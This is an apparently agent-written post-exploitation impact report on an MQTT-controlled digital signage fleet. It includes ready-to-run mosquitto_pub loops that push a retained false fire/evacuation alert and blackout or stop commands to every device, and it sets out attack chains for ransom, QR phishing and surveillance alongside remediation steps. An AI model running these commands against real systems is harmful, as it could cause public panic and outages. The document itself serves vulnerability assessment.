# Impact Assessment — PulseLink Post-Exploitation

**Engagement:** PulseLink IoT Digital Signage Platform
**Phase:** Post-Exploitation — Maximum Damage Analysis
**Target:** pulse.n-compass.online:8883 (Fleet-wide)
**Agent:** specter-post
**Date:** 2026-03-17

---

## Executive Summary

The combination of a shared fleet certificate, wildcard topic access, and MQTT command injection capability means an attacker with the extracted certificates has **full control over the entire PulseLink digital signage fleet**. The worst-case impact includes fleet-wide content manipulation (misinformation/defacement), service disruption (all screens dark), malware delivery (via content URLs), and pivoting into dozens of physical networks through device shells. **This is a CRITICAL finding with real-world consequences for a public-facing display system.**

---

## 1. Impact Scope

### What the Attacker Controls

```
┌─────────────────────────────────────────────────────────────────────┐
│                    FULL FLEET IMPACT MAP                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Attacker possesses:                                                │
│  ├── TLS CA certificate (broker trust chain)                        │
│  ├── Generic client certificate (shared fleet credential)           │
│  ├── Private key (644 permissions, extractable from any device)     │
│  └── Knowledge of broker endpoint and topic structure               │
│                                                                     │
│  Access granted:                                                    │
│  ├── READ:  All device status, content, telemetry                   │
│  ├── WRITE: All device content, commands, configuration             │
│  ├── ENUM:  All device serials, dealer IDs, admin data              │
│  ├── SCOPE: ENTIRE FLEET (not just one device)                      │
│  └── PERSIST: Retained messages, cron, SSH, service mods            │
│                                                                     │
│  Potential fleet size: Unknown (estimation needed)                   │
│  Potential locations: Multiple (dealer-based distribution)           │
│  Display type: Public-facing digital signage                        │
│  Content type: Unknown (ads, info, alerts, branding)                │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 2. Impact Categories

### 2A. Content Manipulation (CRITICAL)

**Capability:** Replace content on any or all screens in the fleet.

| Attack | Scope | Business Impact | Safety Impact |
|--------|-------|-----------------|---------------|
| Defacement | Single device | Brand damage | Low |
| Fleet-wide defacement | All devices | Severe brand damage | Medium |
| Misinformation display | All devices | Legal liability | **HIGH** |
| False emergency alerts | All devices | Public safety risk | **CRITICAL** |
| Phishing (QR codes/URLs) | All devices | User compromise | Medium |
| Crypto mining (web content) | All devices | Resource abuse | Low |
| Competitor messaging | Single device | Business loss | Low |

**Real-world scenarios:**

1. **False emergency alert:** In a building lobby, display "FIRE — EVACUATE" causing panic
2. **Misinformation:** In a transit station, display false schedule changes or political messages
3. **Phishing:** Display QR codes that lead to credential harvesting pages
4. **Ransomware delivery:** Display "Your displays have been locked" with ransom demand
5. **Brand sabotage:** Replace client content with offensive material

**Proof of concept:**

```bash
# Push false emergency alert to all devices
cat > /tmp/emergency.json << 'EOF'
{
  "content": [{
    "type": "html",
    "html": "<div style='background:red;color:white;font-size:48px;padding:40px;text-align:center;'>⚠️ EMERGENCY ALERT ⚠️<br>Please evacuate the building immediately.<br>Follow emergency exit signs.</div>",
    "duration": 300
  }],
  "priority": "critical"
}
EOF

while read serial; do
  mosquitto_pub -h pulse.n-compass.online -p 8883 \
    --cafile ca.crt --cert client_pi_generic.crt --key client_pi_generic.key \
    -t "device/$serial/content" -f /tmp/emergency.json --retain
done < discovered_serials.txt
```

### 2B. Service Disruption (CRITICAL)

**Capability:** Disable all screens simultaneously or selectively.

| Attack | Scope | Impact |
|--------|-------|--------|
| Blackout all screens | Fleet-wide | Complete service outage |
| Disable specific client's screens | Targeted | SLA violation, revenue loss |
| Intermittent disruption | Fleet-wide | Unreliability perception |
| Retained message poisoning | Fleet-wide | Persistent disruption |

**Proof of concept:**

```bash
# Fleet-wide service disruption
while read serial; do
  mosquitto_pub -h pulse.n-compass.online -p 8883 \
    --cafile ca.crt --cert client_pi_generic.crt --key client_pi_generic.key \
    -t "device/$serial/command" \
    -m '{"action":"stop"}'
done < discovered_serials.txt

# Blackout by sending blank content
cat > /tmp/blackout.json << 'EOF'
{"content":[{"type":"image","url":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==","duration":3600}]}
EOF

while read serial; do
  mosquitto_pub -h pulse.n-compass.online -p 8883 \
    --cafile ca.crt --cert client_pi_generic.crt --key client_pi_generic.key \
    -t "device/$serial/content" -f /tmp/blackout.json --retain
done < discovered_serials.txt
```

### 2C. Data Exfiltration (HIGH)

**Capability:** Monitor all fleet communications, identify business relationships, and gather intelligence.

| Data Type | Sensitivity | Business Impact |
|-----------|-------------|-----------------|
| Content manifests | HIGH | Client strategy exposure |
| Device locations | HIGH | Physical security risk |
| Dealer relationships | MEDIUM | Business intelligence |
| Operating hours | MEDIUM | Physical security risk |
| Firmware versions | MEDIUM | Vulnerability mapping |
| Network configurations | HIGH | Attack surface expansion |

### 2D. Network Pivoting (HIGH — If Shell Access Obtained)

**Capability:** Use compromised devices as pivot points into local networks.

| Scenario | Devices | Networks Accessible |
|----------|---------|-------------------|
| Single device shell | 1 | 1 local network |
| Fleet-wide command injection | All | All device local networks |
| Multi-site deployment | All | All physical locations |

**Impact multiplier:** If the fleet spans 50 physical locations, a single MQTT compromise provides 50 network footholds.

### 2E. Supply Chain Attack (CRITICAL — If Firmware Manipulation Possible)

**Capability:** If the platform supports OTA updates via MQTT, push malicious firmware to the entire fleet.

| Attack | Scope | Impact |
|--------|-------|--------|
| Malicious firmware push | Fleet-wide | Total device compromise |
| Backdoored update | Fleet-wide | Persistent backdoor |
| Cryptomining firmware | Fleet-wide | Resource abuse at scale |

---

## 3. Worst-Case Scenario Analysis

### Scenario 1: Public Safety Impact (CRITICAL)

**Context:** PulseLink displays in public buildings (airports, hospitals, transit, schools)

**Attack chain:**
1. Extract certificates → connect to broker
2. Push false emergency alerts to all displays
3. Cause mass panic or evacuation chaos
4. During chaos, conduct physical attack (theft, access)

**Impact:**
- Physical harm to people
- Criminal liability
- Regulatory investigation
- Complete brand destruction
- Potential manslaughter charges (if injuries occur)

**Likelihood:** Medium — requires public-facing deployment with emergency display capability

### Scenario 2: Ransomware of Displays (HIGH)

**Attack chain:**
1. Extract certificates → connect to broker
2. Push "Your displays are locked" message with ransom demand
3. Blackout all screens until ransom paid
4. Threaten to push offensive content if ransom not paid

**Impact:**
- Revenue loss for all clients
- Reputational damage
- Potential regulatory fines (data protection, if customer data exposed)
- Ransom payment pressure

**Likelihood:** Medium-High — straightforward monetization

### Scenario 3: Mass Phishing (HIGH)

**Attack chain:**
1. Extract certificates → connect to broker
2. Display QR codes on all screens linking to phishing pages
3. Capture credentials from people who scan QR codes
4. Use captured credentials for further attacks

**Impact:**
- Credential theft at scale
- Brand liability for enabling phishing
- Regulatory action (FTC, data protection)

**Likelihood:** High — easy to execute, clear value to attacker

### Scenario 4: Persistent Surveillance (MEDIUM)

**Attack chain:**
1. Extract certificates → connect to broker
2. If devices have cameras or microphones, attempt to enable them
3. Exfiltrate audio/video from all locations
4. Sell surveillance data or use for corporate espionage

**Impact:**
- Privacy violations (GDPR, CCPA, wiretapping laws)
- Criminal prosecution
- Massive civil liability

**Likelihood:** Low-Medium — depends on device capabilities

---

## 4. Impact by Attack Vector

| Vector | Prerequisites | Scope | Severity | Detectability |
|--------|--------------|-------|----------|---------------|
| Content injection | Certs only | Fleet-wide | CRITICAL | Medium |
| Service disruption | Certs only | Fleet-wide | CRITICAL | High |
| Retained message poisoning | Certs only | Fleet-wide | HIGH | Low |
| Data exfiltration | Certs only | Fleet-wide | HIGH | Low |
| Command injection (shell) | Certs + command topic | Per-device | CRITICAL | Medium |
| SSH persistence | Shell access | Per-device | HIGH | Low |
| Firmware manipulation | Certs + OTA capability | Fleet-wide | CRITICAL | Low |
| Network pivoting | Shell access | Multi-network | HIGH | Low |
| Lateral movement (local) | Shell access | Local network | MEDIUM | Medium |

---

## 5. Risk Scoring

### CVSS v3.1 Estimate (Fleet-Wide Content Injection via Shared Certificate)

```
Attack Vector:        Network (AV:N)
Attack Complexity:    Low (AC:L)
Privileges Required:  None (PR:N) — cert is the only requirement
User Interaction:     None (UI:N)
Scope:                Changed (S:C) — affects components beyond the vulnerable device
Confidentiality:      High (C:H) — all fleet data readable
Integrity:            High (I:H) — all fleet content writable
Availability:         High (A:H) — fleet can be disabled

Base Score: ~9.8 (CRITICAL)
```

### Composite Risk Score

| Factor | Score | Notes |
|--------|-------|-------|
| Exploitability | 9/10 | Trivial — just connect with certs |
| Scope | 10/10 | Fleet-wide, potentially hundreds of devices |
| Impact (Business) | 9/10 | Revenue loss, brand damage, legal liability |
| Impact (Safety) | 10/10 | Public safety if false alerts displayed |
| Persistence | 8/10 | Retained messages + service mods |
| Detectability | 3/10 | Hard to detect without content validation |
| **Overall Risk** | **9.8/10** | **CRITICAL** |

---

## 6. Impact Mitigation Priority

### If Compromise Is Confirmed

**Immediate actions (hours):**
1. Rotate the `client_pi_generic` certificate across all devices
2. Flush all retained messages on the broker
3. Audit all content currently displayed on screens
4. Review broker access logs for unauthorized connections
5. Isolate the broker from unauthenticated access

**Short-term (days):**
1. Implement per-device certificates
2. Add content manifest validation/signing
3. Deploy MQTT broker ACLs restricting topic access
4. Implement anomaly detection for unusual publish patterns
5. Add content monitoring/alerting (screenshot analysis)

**Long-term (weeks):**
1. Architecture review — remove generic shared certificates
2. Implement end-to-end content signing
3. Deploy device integrity monitoring
4. Add network segmentation for IoT devices
5. Implement certificate rotation automation
6. Add OTA update signing and validation

---

## 7. Key Findings

### Finding: Fleet-Wide Control from Single Credential
- **Severity:** CRITICAL
- **Detail:** One certificate compromise = total fleet control
- **Impact:** Content manipulation, service disruption, data exfiltration — all fleet-wide
- **Remediation:** Per-device certificates with device-specific ACLs

### Finding: Public Safety Risk from Content Manipulation
- **Severity:** CRITICAL
- **Detail:** Displays in public spaces can show false emergency alerts
- **Impact:** Physical harm, criminal liability, regulatory action
- **Remediation:** Content signing, display output monitoring, emergency alert validation

### Finding: Multi-Network Pivot Potential
- **Severity:** HIGH
- **Detail:** Fleet likely spans multiple physical locations/networks
- **Impact:** One MQTT compromise → dozens of local network footholds
- **Remediation:** Network segmentation, VPN isolation, non-root service execution

### Finding: Low Detection Probability
- **Severity:** HIGH
- **Detail:** No content validation or anomaly detection at device level
- **Impact:** Attacks can persist undetected for extended periods
- **Remediation:** Content monitoring, MQTT publish auditing, anomaly detection

---

*specter-post | Impact Assessment | engagements/pulselink-pi/post-exploit-network/*
